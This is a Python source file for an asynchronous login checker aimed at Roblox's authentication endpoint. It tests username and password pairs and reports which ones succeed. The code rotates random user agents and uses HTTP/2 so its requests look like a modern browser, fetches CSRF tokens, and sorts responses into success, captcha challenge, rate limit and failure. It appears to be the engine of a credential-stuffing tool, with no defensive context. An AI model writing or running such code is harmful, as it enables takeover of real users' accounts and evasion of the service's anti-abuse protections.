import httpx
import asyncio
from fake_useragent import UserAgent

class AdvancedAuthEngine:
    def __init__(self):
        self.ua = UserAgent()
        self.client = httpx.AsyncClient(http2=True) # Use HTTP/2 to look more like a modern browser
        self.base_url = "https://auth.roblox.com/v2/login"

    async def get_token(self):
        """Fetches the required security token for the session."""
        resp = await self.client.post(self.base_url)
        return resp.headers.get("x-csrf-token")

    async def check_credential(self, username, password):
        token = await self.get_token()
        
        # Smarter Header Rotation
        headers = {
            "x-csrf-token": token,
            "user-agent": self.ua.random,
            "referer": "https://www.roblox.com/",
            "origin": "https://www.roblox.com",
            "content-type": "application/json"
        }
        
        payload = {
            "ctype": "Username",
            "cvalue": username,
            "password": password
        }

        try:
            response = await self.client.post(self.base_url, json=payload, headers=headers)
            
            if response.status_code == 200:
                return {"status": "SUCCESS", "data": password}
            elif response.status_code == 403:
                # Often means a Captcha is required or Token expired
                return {"status": "CHALLENGE", "data": response.json()}
            elif response.status_code == 429:
                return {"status": "RATE_LIMIT", "data": None}
            else:
                return {"status": "FAIL", "data": None}
        except Exception as e:
            return {"status": "ERROR", "data": str(e)}

    async def close(self):
        await self.client.aclose()
